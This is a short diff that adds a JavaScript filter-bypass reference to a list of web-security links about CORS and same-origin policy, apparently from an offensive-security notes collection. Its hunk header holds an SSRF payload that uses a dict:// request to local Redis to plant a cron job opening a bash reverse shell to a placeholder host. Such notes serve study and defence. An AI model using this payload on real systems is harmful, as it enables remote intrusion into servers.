@@ -551,6 +551,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 - https://portswigger.net/web-security/cors
 - https://seal9055.com/blog/browser/browser_architecture
 - https://www.devsecurely.com/blog/2024/06/cors-the-ultimate-guide
+- https://book.jorianwoltjer.com/languages/javascript#filter-bypass
 - https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
 - https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
 
